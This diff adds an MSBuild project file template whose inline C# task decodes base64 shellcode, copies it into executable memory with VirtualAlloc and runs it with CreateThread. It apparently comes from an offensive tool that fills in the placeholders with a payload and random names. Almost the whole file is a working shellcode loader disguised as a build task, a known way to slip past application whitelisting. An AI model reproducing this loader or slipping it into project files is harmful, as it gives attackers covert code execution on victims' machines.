@@ -1,0 +1,34 @@
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+ <Target Name="#REPLACEMERANDSTRING#">
+ <#REPLACEMERANDSTRING# />
+ </Target>
+ <UsingTask
+ TaskName="#REPLACEMERANDSTRING#"
+ TaskFactory="CodeTaskFactory"
+ AssemblyFile="C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll" >
+ <Task>
+ <Code Type="Class" Language="cs">
+ <![CDATA[
+using System;using System.Diagnostics;using System.Runtime.InteropServices;using Microsoft.Build.Framework;using Microsoft.Build.Utilities;
+public class #REPLACEMERANDSTRING# : Task, ITask
+{
+private static UInt32 MEM_COMMIT = 0x1000;private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
+[DllImport("kernel32")]private static extern IntPtr VirtualAlloc(UInt32 lpStartAddr,UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
+[DllImport("kernel32")]private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten);
+[DllImport("kernel32")]private static extern IntPtr CreateThread(UInt32 lpThreadAttributes,UInt32 dwStackSize,IntPtr lpStartAddress,IntPtr param,UInt32 dwCreationFlags,ref UInt32 lpThreadId);
+[DllImport("kernel32")]private static extern UInt32 WaitForSingleObject(IntPtr hHandle,UInt32 dwMilliseconds);
+public override bool Execute()
+{
+string pw = "#REPLACEMERANDSTRING#";
+string shell64 = "#REPLACEME64#";
+string shell32 = "#REPLACEME32#";
+byte[] shellcode = null;
+if (IntPtr.Size == 4){shellcode = System.Convert.FromBase64String(shell32);} else {shellcode = System.Convert.FromBase64String(shell64);}
+IntPtr funcAddr = VirtualAlloc(0, (uint)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE); 
+Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
+IntPtr hThread = IntPtr.Zero;uint threadId = 0;IntPtr pinfo = IntPtr.Zero;hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);WaitForSingleObject(hThread, 0xFFFFFFFF);return true;}}
+ ]]>
+ </Code>
+ </Task>
+ </UsingTask>
+ </Project>
